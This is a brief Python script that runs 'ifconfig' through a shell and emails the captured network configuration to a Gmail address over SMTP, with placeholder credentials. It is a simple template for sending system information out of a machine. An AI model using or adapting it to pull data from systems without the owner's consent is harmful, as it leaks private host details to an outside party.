#!/usr/bin/python

import subprocess
import smtplib

def send_mail(email, password, msg):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, msg)
	server.quit()

command = "ifconfig"
result = subprocess.check_output(command, shell=True)
send_mail("mail@gmail.com", "password", result) 
